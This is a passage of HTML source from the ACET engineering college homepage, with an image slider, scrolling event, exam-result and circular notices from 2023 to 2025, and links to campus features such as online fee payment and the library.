                     <b class="pull-right hidden-xs" style="color: white !important; position: relative; right: 18px; font-size: 26px; font-weight: bold;  bottom: 2px; font-family:Roboto, sans-serif;">AUTONOMOUS, NBA & NAAC A+ CGPA 3.40</b>
                     <b class="pull-right visible-xs" style="color: white !important; position: relative; right: 18px; font-size: 12px; font-weight: bold; z-index: 999; bottom: 2px; font-family: Roboto, sans-serif;;margin-top:11px;">AUTONOMOUS,NBA & NAAC A+ CGPA 3.40</b>

                    <!--  <a href="uploads/ARIIA/ARIIA_2021_22.pdf" class="pull-right hidden-xs" target="_blank" style="color: #fd752c !important; position: relative; right: 40px; font-size: 26px; font-weight: bold; z-index: 999; bottom: 2px; font-family: robo">ARIIA 2021-22</a>

                    <a href="uploads/ARIIA/ARIIA_2021_22.pdf" class="pull-right visible-xs" target="_blank" style="color: orange !important; position: relative; right: 40px; font-size: 18px; font-weight: bold; z-index: 999;margin-top: 5px;font-family: robo">ARIIA 2021-22</a> -->

                    <!-- </div> -->
                    <ul>
                                                    <div>
                                <li><a style="text-decoration: none;" target="_blank" href="http://elibrary.in.pearson.com"><span style="color: #fff">For e-books of pearson use the following link </span>click here </a></li>
                            </div>

                                                        <div>
                                <li><a style="text-decoration: none;" target="_blank" href="http://mcgrawhilleducation.pdn.ipublishcentral.com"><span style="color: #fff">For e-books of mcgrawhill use the following link </span>click here </a></li>
                            </div>

                                                        <div>
                                <li><a style="text-decoration: none;" target="_blank" href="https://www.youth4work.com/onlinetalenttest"><span style="color: #fff">AICTE Directive For Skill Testing Of The Students </span>click here </a></li>
                            </div>

                                                </ul>
                </div>

                <!-- news -->
                <!-- <div class="pull-right;" style="display:block;background:#fd752c;color: #ffffff;font-weight: bold;"><marquee width="100%" direction="left" height="16px" onmouseover="this.stop();" onmouseout="this.start();"><blink><a href="https://forms.office.com/r/9YzURka9QM" target="_blank" style="color: white;">For any compliants contact  <b style="color: blue">ICC</b> </a></blink></marquee></div> -->
                <div class="pull-right;" style="display:block;background:#fd752c;color: #ffffff;font-weight: bold;"><marquee width="100%" direction="right" height="16px" onmouseover="this.stop();" onmouseout="this.start();">
                    <blink><a href="?p=ForComplaints" target="_blank" style="color: white;">For any compliants contact  
                    </a></blink> 
                </marquee>
               </div>

                <!-- <div class="pull-right;" style="display:block;background:#002147;color: #ffffff;font-weight: bold;"><marquee direction="right" width="100%" direction="left" height="16px" onmouseover="this.stop();" onmouseout="this.start();"><blink><a href="?p=Faculty Recruitment" target="_blank" style="color: white;">Faculty Recruitment & Ratification  <b style="color:yellow"> (Last Date to submit 27-01-2022 )</b> </a></blink></marquee></div> -->

                 <div class="pull-right;" style="display:block;background:#002147;color: #ffffff;font-weight: bold;"><marquee direction="left" width="100%" direction="left" height="16px" onmouseover="this.stop();" onmouseout="this.start();"><blink><a href="?p=FDP" target="_blank" style="color: white;">Glimpses of the faculty development programme on English language TEACHnology organised by ACET   </a></blink></marquee></div> 

                <!--  <div class="pull-right;" style="display:block;background:#002147;color: #ffffff;font-weight: bold;"><marquee direction="left" width="100%" direction="left" height="16px" onmouseover="this.stop();" onmouseout="this.start();"><blink><a href="https://forms.gle/zcXHPqthhanswZfd7" target="_blank" style="color: white;">A two day FDP on “ENGLISH LANGUAGE TEACHNOLOGY” Dates: 11th and 12th AUGUST 2023 Registration Link:   <b style="color:yellow"> ( https://forms.gle/zcXHPqthhanswZfd7 )</b> </a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</blink>
                    
                <blink style="margin-right: 45px;"><a href="FDP_final_brochure.pdf" target="_blank" style="color: white;"> Brochure  </a></blink>
               </marquee></div> -->


              
        <script src="js/jssor.slider-25.2.0.min.js" type="text/javascript"></script>
<script type="text/javascript">
    jssor_1_slider_init = function() {

        var jssor_1_SlideoTransitions = [
        [{b:900,d:2000,x:-379,e:{x:7}}],
        [{b:900,d:2000,x:-379,e:{x:7}}],
        [{b:-1,d:1,o:-1,sX:2,sY:2},{b:0,d:900,x:-171,y:-341,o:1,sX:-2,sY:-2,e:{x:3,y:3,sX:3,sY:3}},{b:900,d:1600,x:-283,o:-1,e:{x:16}}]
        ];

        var jssor_1_options = {
          $AutoPlay: 1,
          $SlideDuration: 2000,
          $SlideEasing: $Jease$.$OutQuint,
          $CaptionSliderOptions: {
            $Class: $JssorCaptionSlideo$,
            $Transitions: jssor_1_SlideoTransitions
        },
        $ArrowNavigatorOptions: {
            $Class: $JssorArrowNavigator$
        },
        $BulletNavigatorOptions: {
            $Class: $JssorBulletNavigator$
        }
    };

    var jssor_1_slider = new $JssorSlider$("jssor_1", jssor_1_options);

    /*#region responsive code begin*/
    /*remove responsive code if you don't want the slider scales while window resizing*/
    function ScaleSlider() {
        var refSize = jssor_1_slider.$Elmt.parentNode.clientWidth;
        if (refSize) {
            refSize = Math.min(refSize, 3000);
            jssor_1_slider.$ScaleWidth(refSize);
        }
        else {
            window.setTimeout(ScaleSlider, 30);
        }
    }
    ScaleSlider();
    $Jssor$.$AddEvent(window, "load", ScaleSlider);
    $Jssor$.$AddEvent(window, "resize", ScaleSlider);
    $Jssor$.$AddEvent(window, "orientationchange", ScaleSlider);
    /*#endregion responsive code end*/
};
</script>
<style>
    /* jssor slider loading skin double-tail-spin css */

    .jssorl-004-double-tail-spin img {
        animation-name: jssorl-004-double-tail-spin;
        animation-duration: 1.2s;
        animation-iteration-count: infinite;
        animation-timing-function: linear;
    }

    @keyframes jssorl-004-double-tail-spin {
        from {
            transform: rotate(0deg);
        }

        to {
            transform: rotate(360deg);
        }
    }


    .jssorb051 .i {position:absolute;cursor:pointer;}
    .jssorb051 .i .b {fill:#fff;fill-opacity:0.5;stroke:#000;stroke-width:400;stroke-miterlimit:10;stroke-opacity:0.5;}
    .jssorb051 .i:hover .b {fill-opacity:.7;}
    .jssorb051 .iav .b {fill-opacity: 1;}
    .jssorb051 .i.idn {opacity:.3;}

    .jssora051 {display:block;position:absolute;cursor:pointer;}
    .jssora051 .a {fill:none;stroke:#fff;stroke-width:360;stroke-miterlimit:10;}
    .jssora051:hover {opacity:.8;}
    .jssora051.jssora051dn {opacity:.5;}
    .jssora051.jssora051ds {opacity:.3;pointer-events:none;}
</style>
<div class="flash_margin" id="jssor_1" style="position:relative;margin:0 auto;top:0px;left:0px;width:1300px;height:400px;overflow:hidden;visibility:hidden;">
    <!-- Loading Screen -->
    <div data-u="loading" class="jssorl-004-double-tail-spin" style="position:absolute;top:0px;left:0px;width:100%;height:100%;text-align:center;background-color:rgba(0,0,0,0.7);">
        <img style="margin-top:-19px;position:relative;top:50%;width:38px;height:38px;" src="img/double-tail-spin.svg" />
    </div>
    <div data-u="slides" style="cursor:default;position:relative;top:0px;left:0px;width:1302px;height:400px;overflow:hidden;">
                    <div>
                <a href="#" target="new"><img src="ACET/banners/044D5DF2-0CF2-4F1D-A588-62345C347843.jpeg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/09E6F923-6FFB-4A23-9DDA-8273E88E74F9.jpeg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/Crouse.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/Campus.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/153.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/Celonis_MOU.png" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/mou_Cyber security.png" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/FFDA31A6-8622-48D9-A44B-BA91B8165376.jpeg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/Green Ranking Acet.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/E2BC46B0-4C20-4453-94E8-FB0D3C1FBEBD.jpeg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/Acet Rankings 2023.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/WEB BANNER.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="#" target="new"><img src="ACET/banners/Hackathon.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="" target="new"><img src="ACET/banners/placements151223.jpeg" data-u="image" /></a>
            </div>
                        <div>
                <a href="" target="new"><img src="ACET/banners/222.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="" target="new"><img src="ACET/banners/237.jpg" data-u="image" /></a>
            </div>
                        <div>
                <a href="" target="new"><img src="ACET/banners/Btech_courses_2023.jpeg" data-u="image" /></a>
            </div>
                        <div>
                <a href="" target="new"><img src="ACET/banners/ACET_SILICON.jpg" data-u="image" /></a>
            </div>
            
        

        <a data-u="any" href="https://www.jssor.com" style="display:none">slider bootstrap</a>
    </div>
    <!-- Bullet Navigator -->
    <div data-u="navigator" class="jssorb051" style="position:absolute;bottom:14px;right:12px;" data-autocenter="1" data-scale="0.5" data-scale-bottom="0.75">
        <div data-u="prototype" class="i" style="width:10px;height:10px;">
            <svg viewbox="0 0 16000 16000" style="position:absolute;top:0;left:0;width:100%;height:100%; color: #EC6224 !important;">
                <circle class="b" cx="8000" cy="8000" r="5800"></circle>
            </svg>
        </div>
    </div>
    <!-- Arrow Navigator -->
    <div data-u="arrowleft" class="jssora051" style="width:40px;height:40px;top:0px;left:25px;" data-autocenter="2" data-scale="0.75" data-scale-left="0.75">
        <svg viewbox="0 0 16000 16000" style="position:absolute;top:0;left:0;width:100%;height:100%;">
            <polyline class="a" points="11040,1920 4960,8000 11040,14080 "></polyline>
        </svg>
    </div>
    <div data-u="arrowright" class="jssora051" style="width:40px;height:40px;top:0px;right:25px;" data-autocenter="2" data-scale="0.75" data-scale-right="0.75">
        <svg viewbox="0 0 16000 16000" style="position:absolute;top:0;left:0;width:100%;height:100%;">
            <polyline class="a" points="4960,1920 11040,8000 4960,14080 "></polyline>
        </svg>
    </div>
</div>
<script type="text/javascript">jssor_1_slider_init();</script>
<!-- #endregion Jssor Slider End -->
﻿<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.carousel.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.theme.min.css">
<!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script> -->
<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" /> -->



<title>ACET - Aditya College oF Engineering & Technology</title>


<style>
    .bg-info {
    background-color: #ffffff;
}
.text-divider span {
    background-color: #fd752c;
    color: #fff;
    /* padding: 1em; */
    padding: 10px 5px;
    font-family: Roboto, sans-serif;
    font-size: 18px;
}
    /*p{
      font-family:Roboto
    }*/
  
 .testimonial{ margin: 0 10px; }
.testimonial .testimonial-content{
    margin: 20px 0 50px 0;
    position: relative;
}
.testimonial .testimonial-content:after{
    content: "";
    width: 20px;
    height: 20px;
    border-top: 20px solid #002147;
    border-left: 20px solid transparent;
    border-right: 20px solid transparent;
    margin: 0 auto;
    position: absolute;
    bottom: -20px;
    left: 0;
    right: 0;
}
.testimonial .description{
    padding: 25px 35px;
    margin: 0;
    background: #002147;
    border-radius: 15px;
    font-size: 20px;
    color: #fff;
    position: relative;
    /*font-family: "Roboto";*/
}
.testimonial .description:before,
.testimonial .description:after{
    /*font-family: "Roboto";*/
    width: 35px;
    height: 35px;
    line-height: 35px;
    border-radius: 8px;
    text-align: center;
    background: #002147;
    position: absolute;
}
.testimonial .description:before{
    content: "\f10d";
    top: -18px;
    left: 25px;
}
.testimonial .description:after{
    content: "\f10e";

    bottom: -18px;
    right: 25px;
}
.testimonial .testimonial-profile{
    display: table;
    padding: 15px;
    border: 1px solid #002147;
    border-radius: 20px;
    margin: 0 auto;
    position: relative;
}
.testimonial .pic{
    width: 100px;
    height: 100px;
    border-radius: 50%;
    border: 1px solid #002147;
    float: left;
    overflow: hidden;
}
.testimonial .title{
    display: inline-block;
    margin: 0 0 0 30px;
    font-size: 19px;
    font-weight: bold;
    color: #fd752c;
    position: relative;
    top: 22px;
}
.testimonial .title:before{
    content: "";
    width: 1px;
    height: 70px;
    background: #002147;
    position: absolute;
    top: -8px;
    left: -15px;
}
.testimonial .post{
    display: block;
    font-size: 14px;
    font-weight: normal;
    color: #888;
    margin-top: 10px;
}
.owl-theme .owl-controls{
    margin-top: 30px;
}
.owl-theme .owl-controls .owl-page span{
    background: transparent;
    border: 1px solid #002147;
    opacity: 1;
}
.owl-theme .owl-controls .owl-page.active span{
    background: #002147;
    border: 1px solid #002147;
}
@media only screen and (max-width: 479px){
    .testimonial .description{
        padding: 20px;
        font-size: 16px;
    }
    .testimonial .testimonial-profile{ padding: 10px; }
    .testimonial .title{ font-size: 16px; }
    .testimonial .post{ font-size: 13px; }
}

.accreditations {
    background: rgb(10 93 134);
    color: white;
}

   
  </style>
  <!-- News and Updates -->

  <script>
    function circular(data) {
      $(".circular"+data).click();
    }

  </script>
  
    
    <!-- <center>
            <div class="container" style="margin-left: 10px !important">
            <div class="popup_this_container">
                <div id="popup_this" class="animate__animated animate__backInDown">
                    <span class="button b-close" id="b-close" style="margin-top: -70px;">
                        <span><b style="margin-left: -3px">X</b></span>
                    </span>
                    <img class="image_1"  src="AUTONOMOUS.jpeg" style="margin-top: -80px;height: 600px;width: 1130px;">
                </div>
            </div>
        </div>
    </center> -->



  <div id="news_updates" class="container-fluid" style="padding: 0 !important;">
    <div class="grid-divider notifications" style="border: none;">
      <div class="col-md-3">
        <div class="col-padding">
          <div class="row text-center">
            <h3 class="text-left text-divider"><span>EVENTS</span></h3>
          </div>
          <!-- Fluid width widget -->  
          <br>      
          <div class="panel panel-primary" >
            <div class="panel-body">
              <marquee direction="up" behavior="scroll" onmouseover="this.stop();" onmouseout="this.start();" style="height:370px;">
                <ul class="media-list">
                   
                      <form method="post" action="?p=events_view">
                        <button class="btn btn-default hide circular4" name="circular" value="NA=="></button>
                        <li class="media" onclick="circular(4)">
                          <div class="media-left">
                            <div class="panel panel-primary text-center date">
                              <div class="panel-heading month">
                                <span class="panel-title strong">
                                  NOV                                </span>
                              </div>
                              <div class="panel-body day text-primary" style="color: #FD752C;">
                                22                              </div>
                            </div>
                          </div>
                          <div class="media-body">
                            <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                              The registration link for EFx ACET is now live                            </h4>

                            <label>More</label>
                          </div>
                        </li><!-- </a> -->
                      </form><br/>
                       
                      <form method="post" action="?p=events_view">
                        <button class="btn btn-default hide circular3" name="circular" value="Mw=="></button>
                        <li class="media" onclick="circular(3)">
                          <div class="media-left">
                            <div class="panel panel-primary text-center date">
                              <div class="panel-heading month">
                                <span class="panel-title strong">
                                  SEP                                </span>
                              </div>
                              <div class="panel-body day text-primary" style="color: #FD752C;">
                                30                              </div>
                            </div>
                          </div>
                          <div class="media-body">
                            <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                              Internal Smart India Hackathon 2023                            </h4>

                            <label>More</label>
                          </div>
                        </li><!-- </a> -->
                      </form><br/>
                       
                      <form method="post" action="?p=events_view">
                        <button class="btn btn-default hide circular2" name="circular" value="Mg=="></button>
                        <li class="media" onclick="circular(2)">
                          <div class="media-left">
                            <div class="panel panel-primary text-center date">
                              <div class="panel-heading month">
                                <span class="panel-title strong">
                                  SEP                                </span>
                              </div>
                              <div class="panel-body day text-primary" style="color: #FD752C;">
                                15                              </div>
                            </div>
                          </div>
                          <div class="media-body">
                            <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                              Tech Fest "VEDA -2023"                            </h4>

                            <label>More</label>
                          </div>
                        </li><!-- </a> -->
                      </form><br/>
                       
                      <form method="post" action="?p=events_view">
                        <button class="btn btn-default hide circular1" name="circular" value="MQ=="></button>
                        <li class="media" onclick="circular(1)">
                          <div class="media-left">
                            <div class="panel panel-primary text-center date">
                              <div class="panel-heading month">
                                <span class="panel-title strong">
                                  OCT                                </span>
                              </div>
                              <div class="panel-body day text-primary" style="color: #FD752C;">
                                20                              </div>
                            </div>
                          </div>
                          <div class="media-body">
                            <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                              Rated 3.5 stars by  "Annual Performance Rating of Institutions Innovation Council(IIC) for the academic year 2019-20.                            </h4>

                            <label>More</label>
                          </div>
                        </li><!-- </a> -->
                      </form><br/>
                                      </ul>
              </marquee>

              <a href="?p=Events" class="btn btn-default btn-block">More Events »</a>
            </div>
          </div>
          <!-- End fluid width widget --> 
        </div>
      </div>

      <div class="col-md-3">
        <div class="col-padding">
          <div class="row">
            <h3 class="text-divider text-center"><span>LATEST UPDATES</span></h3>
          </div>
          <br>
           
              <div class="notice notice-default">
                <strong>IV B.Tech II Semester (R16/R19/R20) Adv. Supplementary Examinations, JULY-2025 Result released.</strong>  <b style="cursor: pointer;" data-toggle="collapse" data-target="#desc0" class="pull-right border  text-danger ">Read</b>
                <div class="collapse" id="desc0">
                  <p>
                    IV B.Tech II Semester (R16/R19/R20) Adv. Supplementary Examinations, JULY-2025 Result released. Last Date to apply for Recounting/Revaluation/Challenge Revaluation is : 14-08-2025.                     <a href="?p=Updates" class="pull-right text-info">>> View More</a>
                  </p>        
                </div>
              </div>
               
              <div class="notice notice-default">
                <strong>JNTUK - Apply for the UG & PG provisional certificates all years passed outs (PHASE JULY 2025)</strong>  <b style="cursor: pointer;" data-toggle="collapse" data-target="#desc1" class="pull-right border  text-danger ">Read</b>
                <div class="collapse" id="desc1">
                  <p>
                    Apply for the UG & PG provisional certificates all years passed outs. PHASE JULY 2025    Last Date is 24-07-2025.                    <a href="?p=Updates" class="pull-right text-info">>> View More</a>
                  </p>        
                </div>
              </div>
               
              <div class="notice notice-default">
                <strong>JNTUK - TIME TABLE OF M.TECH II SEMESTER (R19 REGULATION) REGULAR/SUPPLEMENTARY EXAMINATIONS, JULY/AUGUST - 2025</strong>  <b style="cursor: pointer;" data-toggle="collapse" data-target="#desc2" class="pull-right border  text-danger ">Read</b>
                <div class="collapse" id="desc2">
                  <p>
                    TIME TABLE OF M.TECH II SEMESTER (R19 REGULATION) REGULAR/SUPPLEMENTARY EXAMINATIONS, JULY/AUGUST - 2025. Download here.                    <a href="?p=Updates" class="pull-right text-info">>> View More</a>
                  </p>        
                </div>
              </div>
               
              <div class="notice notice-default">
                <strong>JNTUK_4-2 BTech Adv. Supplementary Exams JULY-2025 commencing from 14-07-2025, Exam center circular  </strong>  <b style="cursor: pointer;" data-toggle="collapse" data-target="#desc3" class="pull-right border  text-danger ">Read</b>
                <div class="collapse" id="desc3">
                  <p>
                    All the students attending for 4-2 BTech  Adv.Supplementary Exams JULY-2025 commencing from 21-04-2025, Exam center circular attached. Hall tickets are to be collected from our college on 12-07-2025(Saturday) without fail. Uniform, college Id card & hall ticket are mandatory for the exam. Mobile phones & any electronic gadgets are strictly prohibited at the exam center.
Download circular here.                    <a href="?p=Updates" class="pull-right text-info">>> View More</a>
                  </p>        
                </div>
              </div>
                        <a href="?p=Updates" class="btn btn-default btn-block">More Updates »</a>
        </div>
        <br>
      </div>

      <div class="col-md-3">
    <div class="col-padding">
      <div class="row text-center">
        <h3 class="text-right text-divider"><span>CIRCULARS</span></h3>
      </div>
      <!-- Fluid width widget -->    
      <br>    
      <div class="panel panel-primary" >
        <div class="panel-body">
          <marquee direction="up" behavior="scroll" onmouseover="this.stop();" onmouseout="this.start();" style="height:370px;">
            <ul class="media-list">
              
                <form method="post" action="?p=circulars_view">
                  <button class="btn btn-default hide circular216" name="circular" value="MTY="></button>
                  <li class="media" onclick="circular2(16)">
                    <div class="media-left">
                      <div class="panel panel-primary text-center date">
                        <div class="panel-heading month">
                          <span class="panel-title strong">
                           DEC                         </span>
                       </div>
                       <div class="panel-body day text-primary">
                        2                      </div>
                    </div>
                  </div>
                  <div class="media-body">
                    <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                     III B.Tech. - II Semester Class Work                   </h4>

                   <!-- <label>More >> </label> -->
                   <label> <a href="?p=circulars_view&circular=MTY=" class="pull-right">More ></a></label> 
                 </div>
               </li></form><br/>
                
                <form method="post" action="?p=circulars_view">
                  <button class="btn btn-default hide circular215" name="circular" value="MTU="></button>
                  <li class="media" onclick="circular2(15)">
                    <div class="media-left">
                      <div class="panel panel-primary text-center date">
                        <div class="panel-heading month">
                          <span class="panel-title strong">
                           SEP                         </span>
                       </div>
                       <div class="panel-body day text-primary">
                        29                      </div>
                    </div>
                  </div>
                  <div class="media-body">
                    <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                     Project Batch List                   </h4>

                   <!-- <label>More >> </label> -->
                   <label> <a href="?p=circulars_view&circular=MTU=" class="pull-right">More ></a></label> 
                 </div>
               </li></form><br/>
                
                <form method="post" action="?p=circulars_view">
                  <button class="btn btn-default hide circular214" name="circular" value="MTQ="></button>
                  <li class="media" onclick="circular2(14)">
                    <div class="media-left">
                      <div class="panel panel-primary text-center date">
                        <div class="panel-heading month">
                          <span class="panel-title strong">
                           SEP                         </span>
                       </div>
                       <div class="panel-body day text-primary">
                        29                      </div>
                    </div>
                  </div>
                  <div class="media-body">
                    <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                     Transfer                   </h4>

                   <!-- <label>More >> </label> -->
                   <label> <a href="?p=circulars_view&circular=MTQ=" class="pull-right">More ></a></label> 
                 </div>
               </li></form><br/>
                
                <form method="post" action="?p=circulars_view">
                  <button class="btn btn-default hide circular213" name="circular" value="MTM="></button>
                  <li class="media" onclick="circular2(13)">
                    <div class="media-left">
                      <div class="panel panel-primary text-center date">
                        <div class="panel-heading month">
                          <span class="panel-title strong">
                           SEP                         </span>
                       </div>
                       <div class="panel-body day text-primary">
                        22                      </div>
                    </div>
                  </div>
                  <div class="media-body">
                    <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                     Mobile phone circular                   </h4>

                   <!-- <label>More >> </label> -->
                   <label> <a href="?p=circulars_view&circular=MTM=" class="pull-right">More ></a></label> 
                 </div>
               </li></form><br/>
                
                <form method="post" action="?p=circulars_view">
                  <button class="btn btn-default hide circular212" name="circular" value="MTI="></button>
                  <li class="media" onclick="circular2(12)">
                    <div class="media-left">
                      <div class="panel panel-primary text-center date">
                        <div class="panel-heading month">
                          <span class="panel-title strong">
                           AUG                         </span>
                       </div>
                       <div class="panel-body day text-primary">
                        22                      </div>
                    </div>
                  </div>
                  <div class="media-body">
                    <h4 class="media-heading" style="margin:0; padding: 0 0 6px 0; color: rgb(23, 70, 158);">
                     EKYC (lll phase) at
your nearest SACHIVALAYAM. IMMEDIATELY                    </h4>

                   <!-- <label>More >> </label> -->
                   <label> <a href="?p=circulars_view&circular=MTI=" class="pull-right">More ></a></label> 
                 </div>
               </li></form><br/>
                        </ul>
       </marquee>

       <a href="?p=Circulars" class="btn btn-default btn-block">More circulars »</a>
     </div>
   </div>
   <!-- End fluid width widget --> 
 </div>
</div>

                                    <div class="col-md-3" style="margin-top: -19px;">
                                            <div class="col-padding">
                                                <br>
                                                <div class="row">
                                                    <h3 class="text-right text-divider"><span>TECHNICAL HUB</span></h3>
                                                </div>
                                            </div>
                                        <div id="myCarousel3" class="carousel slide" data-ride="carousel">
                                             <div class="carousel-inner">
                                                <div class="item active">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/4x.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                                <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/t100.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                                 <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/owl coder.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                                 <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/drive ready.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                                <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/drive ready Plus.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                                <div class="item">
                                                    <a href="https://technicalhub.io/"> <img src="technicalhub/Project Space.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                                 <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/t-connect.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                                <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/t-shaped eng.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                                <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/skill up coder.png" class="img-responsive" draggable="false" style=""></a>
                                                </div>
                                               <!--  <div class="item ">
                                                    <a href="https://technicalhub.io/"><img src="logos/beyond_academics/new/code heat.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                               <!--  <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="logos/beyond_academics/new/thub industry connect.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                              <!--   <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="logos/beyond_academics/new/hackathon.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                                <!-- <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="logos/beyond_academics/new/in-campus.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                                <!-- <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="logos/beyond_academics/new/makers square.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                                
                                                <!-- <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="logos/beyond_academics/new/pupa.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                               
                                               <!--  <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="logos/beyond_academics/new/why py.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                               
                                                <!--  <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/skill up evening.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                               <!--   <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/becomecoder.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                                <!-- <div class="item">
                                                     <a href="https://technicalhub.io/"><img src="technicalhub/become coder.png" class="img-responsive" draggable="false" style="height: 355px"></a>
                                                </div> -->
                                            </div>
                                        </div>
                                        <div class="text-center">
                                            <a class="" href="#myCarousel3" data-slide="prev">
                                                <span class="glyphicon glyphicon-chevron-left"></span>
                                                <span class="sr-only">Previous</span>
                                            </a>
                                            <a class="" href="#myCarousel3" data-slide="next">
                                                <span class="glyphicon glyphicon-chevron-right"></span>
                                                <span class="sr-only">Next</span>
                                            </a>
                                        </div>
                                  </div>

      

         
    </div>
  </div>
  <br>
</div>  
<!-- End of News and Updates -->

<!-- Accreditions -->
<div class="container-fluid centered accreditations">
  
  <!-- End of Accreditions -->



  <!-- Features -->
  <div class="row centered features " style="background: rgb(10, 93, 134);">
    <br>
    <div id="features" class="container text-center" >
      <center>
        <h3 style="padding: 0;margin: 0" class="text-divider"><strong><span>FEATURES</span></strong></h3>
        <br><br/>
        <div class="row text-center">

          <div class="col-md-2 col-md-offset-1">
            <a href="http://target.technicalhub.io" target="new">
              <span class="fa-stack fa-4x">
                <!-- <img src="logos/key_features/target.png" style="width:140px; height:120px; margin-left:-10px;"> -->
                <img src="logos/key_features/target.png" style="width:140px; height:110px; margin-left:-10px; margin-top:10px;">
              </span>
              <h4 class="service-heading">TARGET</h4>
              <!-- <p class="text-muted">No more excuses – You name it, ‘Target’ has it. Keeping in mind the present curricula, ‘Target’ has been devised specifically for students to learn anything that addresses their required skills. </p> -->
            </a>
          </div>

          <div class="col-md-2">
            <a href="?p=Payment-Policy"  target="new">
              <span class="fa-stack fa-4x">
                <img src="logos/key_features/op.png" style="width:100px; height:100px;">
              </span>
              <h4 class="service-heading">Online Fee Payment</h4>
              <!-- <p class="text-muted"> The most common means of payment involve use of money, cheque, or debit, credit or bank transfers. </p> -->
            </a>
          </div>
          <div class="col-md-2">
            <a href="?p=byndr-faq" target="new">
              <span class="fa-stack fa-4x">
                <img src="logos/key_features/black360logo-small.png" style="width:100px; height:70px; ">
              </span>
              <h4 class="service-heading">LMS</h4>
              <!-- <p class="text-muted">LMS (Learning Management System) is a software application for the administration, documentation, tracking, reporting and delivery of educational courses or training programs. Through “Byndr” this is made easy, simple and adaptable.</p> -->
            </a>
          </div>
          <div class="col-md-2">
            <a href="http://adityalibrary.blogspot.in/" target="new">
              <span class="fa-stack fa-4x">
                <img src="logos/key_features/aeclibrary.png" style="width:100px; height:100px;">
              </span>
              <h4 class="service-heading">ADITYA LIBRARY</h4>
              <!-- <p class="text-muted">Libraries are the roots deep embedded of this humongous “Aditya” sharing its Wisdom & Knowledge. It has a vast and eclectic collection of books, journals, databases, audio-visual aids, CDs, DVDs, e-books, project reports, course material, classics and bound volumes of earlier examination papers.</p> -->
            </a>
          </div>

          <!-- <div class="col-md-2">
            <a href="http://210.212.210.85/moodle" target="new">
              <span class="fa-stack fa-4x">
                <img src="logos/key_features/Moodle%20Hat%20Orange%20Background.png" style="width:100px; height:100px;">
